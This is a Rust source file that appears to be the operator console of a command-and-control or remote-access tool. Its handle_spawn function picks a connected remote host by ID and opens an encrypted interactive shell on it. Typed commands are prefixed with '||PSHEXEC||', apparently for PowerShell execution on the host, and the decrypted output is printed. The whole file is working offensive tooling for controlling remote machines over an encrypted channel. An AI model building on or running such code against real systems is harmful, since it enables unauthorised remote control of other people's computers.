use crate::utils::ConnectionInfo;
use simple_crypt::{decrypt, encrypt};
use std::{
    collections::HashMap,
    io::{Error, ErrorKind, Write},
    sync::Arc,
};
use tokio::{
    io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt},
    select,
    sync::Mutex,
};

pub async fn handle_spawn(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
    command: &str,
    raw_connection: bool,
) -> Result<String, Error> {
    let parts: Vec<&str> = command.splitn(2, ' ').collect();
    if parts.len() < 2 {
        return Err(Error::new(
            ErrorKind::InvalidInput,
            "Invalid command, expected 'spawn ID'",
        ));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err(Error::new(ErrorKind::InvalidInput, "Invalid ID")),
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err(Error::new(ErrorKind::InvalidInput, "Invalid ID"));
    }

    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let shared_secret = connection_info.shared_secret.clone();

    let stream = connection_info.stream.clone();
    let mut stream_lock = stream.lock().await;
    let (mut reader, mut writer) = stream_lock.split();
    let mut prefix = String::new();
    let mut input = String::new();
    let mut output = [0; 65535];
    let mut encrypted_input;
    let mut decrypted_output;
    let mut myreader = tokio::io::BufReader::new(tokio::io::stdin());

    if !raw_connection {
        prefix = "||PSHEXEC|| ".to_string();
    }

    println!(
        "Spawned new shell on remote ID: {}. Type 'exit' to return.",
        id
    );
    loop {
        print!("$: ");
        std::io::stdout().flush().unwrap();
        select! {
            Ok(_) = myreader.read_line(&mut input) => {
                if input.contains("exit") {
                    break;
                }
                encrypted_input = encrypt(format!("{}{}", prefix, input).as_bytes(), &shared_secret).expect("Failed to encrypt");
                writer.write_all(&encrypted_input).await?;
                input.clear();
            }
            Ok(_) = reader.read(&mut output) => {
                decrypted_output = decrypt(&output, &shared_secret).expect("Failed to decrypt");
                let mut cmdout = String::from_utf8_lossy(&decrypted_output).to_string();
                cmdout = cmdout.replace("||cmd||", "");
                println!("\r{}", cmdout);
                output = [0; 65535];
            }
        }
    }
    Ok(format!("Exited interactive shell on {}", id))
}
